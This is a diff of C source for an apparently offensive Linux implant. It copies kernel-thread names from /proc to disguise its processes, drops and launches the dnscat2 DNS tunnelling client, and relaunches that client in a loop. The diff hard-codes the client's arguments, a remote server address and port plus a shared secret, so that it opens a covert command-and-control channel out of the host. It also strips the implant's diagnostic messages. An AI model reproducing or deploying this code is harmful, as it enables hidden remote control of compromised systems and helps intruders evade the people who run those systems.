@@ -35,28 +35,17 @@
 #define CLONE_NEWPID    0x20000000
 #endif
 
-#define YOLO(x) (void)x
-
-#define DNSCATCMDLINE_LEN  4096
-
-// we add a new elf section, were you put in your command line arguments to dnscat
-char dnscat_cmdline[DNSCATCMDLINE_LEN] __attribute__ ((section ("DNSCMDLINE"))) = {
-	"dnscat\0"
-	"--dns\0"
-	"server=xxx.xxx.xxx.xxx,port=53\0"
-	"--secret=fa11fa11fa11fa11fa11fa11fa11fa11"
-	"\0\0YOU SHOULD CHANGE TO ABOVE TO CONNECT TO YOUR OWN SERVER"
-};
-
 pid_t init_pid;
 
 extern pid_t __clone(int, void *);
-
 static inline int raw_clone(unsigned long flags, void *child_stack) {
 	return __clone(flags, child_stack);
 }
 
-static int is_proc(char *name)
+/**
+ * This function check, from the name, if it is a process
+ **/
+static int is_process(char *name)
 {
 	int i;
 	for (i = 0; i < strlen(name); i++) {
@@ -67,9 +56,12 @@ static int is_proc(char *name)
 	return 1;
 }
 
+/**
+ * This function return a new pid name
+ **/
 static char* grab_kernel_thread(char *name)
 {
-	FILE* stat;
+		FILE* stat;
 	char buf[4096];
 
 	int pid;
@@ -84,10 +76,8 @@ static char* grab_kernel_thread(char *name)
 	snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
 	
 	stat = fopen(buf, "r");
-	if (stat == NULL) {
-		printf("couldn't open /proc/%s/stat\n", name);
+	if (stat == NULL)
 		goto out;
-	}
 	
 	fgets(buf, sizeof(buf) - 1, stat);
 	sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
@@ -109,21 +99,22 @@ out:
 	return ret;
 }
 
+/**
+ * This function save in threads the names of process in /proc
+ **/
 static void grab_kernel_threads(char **threads)
 {
 	DIR *dirp;
 	int i = 0;
 	struct dirent *dp;
 
-	if ((dirp = opendir("/proc")) == NULL) {
-		printf("couldn't open '/proc'\n");
+	if ((dirp = opendir("/proc")) == NULL)
 		exit(EXIT_FAILURE);
-	}
 
 	do {
 		errno = 0;
 		if ((dp = readdir(dirp)) != NULL) {
-			if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
+			if (dp->d_type == DT_DIR && is_process(dp->d_name)) {
 				char *name = grab_kernel_thread(dp->d_name);
 				if (name) {
 					threads[i] = name;
@@ -133,11 +124,10 @@ static void grab_kernel_threads(char **threads)
 		}
 	} while (dp != NULL);
 
-	if (errno != 0) {
-		printf("error reading directory\n");
+	if (errno != 0)
 		exit(EXIT_FAILURE);
-	}
-	(void) closedir(dirp);
+	
+	closedir(dirp);
 }
 
 /** 
@@ -273,6 +263,9 @@ static void set_prctl_name(char *name)
  * End section stolen from https://github.com/lxc/lxc/blob/master/src/lxc/utils.c#L1572
  **/
 
+/**
+ * This function create the threads
+ **/
 static void make_kernel_threads(char **threads)
 {
 	int i;
@@ -316,51 +309,30 @@ static void write_dnscat2()
 }
 
 /**
- * This function run dnscat2 process
+ * This function run dnscat2 process and pass in command line the argument to connect to the server
  **/
 static pid_t run_dnscat2()
 {
 	pid_t pid;
+	char *argv[5];
 
 	pid = fork();
-	if (pid < 0) {
-		printf("couldn't fork!\n");
+	if (pid < 0)
 		exit(EXIT_FAILURE);
-	} else if (pid == 0) {
-		/* child */
-		char *argv[8]; /* assumption is less than 7 args */
-		int last_null, counter;
 
-		/* cook dnscat_cmdline into an argv */
+	if (pid == 0) {
 		memset((void*)argv, 0, sizeof(argv));
 
-		last_null = 0; /* special case for start */
-		counter = 0;
-		for (int i = 0; i < DNSCATCMDLINE_LEN - 1; i++) {
-			if (dnscat_cmdline[i] == 0) {
-				argv[counter] = &(dnscat_cmdline[last_null+1]);
-				if (dnscat_cmdline[i+1] == 0) {
-					break;
-				}
-				last_null = i;
-				counter++;
-			}
-			if (counter == 7) {
-				break;
-			}
-		}
-
-		close(0);
-		close(1);
-		close(2);
-
-		YOLO(open("/dev/null", O_RDONLY));
-		YOLO(open("/dev/null", O_WRONLY));
-		YOLO(open("/dev/null", O_RDWR));
+		// fill command line arguments
+		argv[0] = "dnscat";
+		argv[1] = "--dns";
+		argv[2] = "server=10.220.190.238,port=53531";
+		argv[3] = "--secret=a9a053c554ada1fab5983d0495e3c441";
 
 		execv(DNSCAT_PATH, argv);
 		exit(EXIT_FAILURE);
 	}
+	
 	return pid;
 }
 
@@ -442,8 +414,6 @@ void perform_hacks()
 				handle_init_exit(status);
 			} else if (pid == dnscat_pid) {
  				dnscat_pid = run_dnscat2();
-			} else {
-				printf("unknown other pid %d exited\n", pid);
 			}
 			sleep(1);
 		}
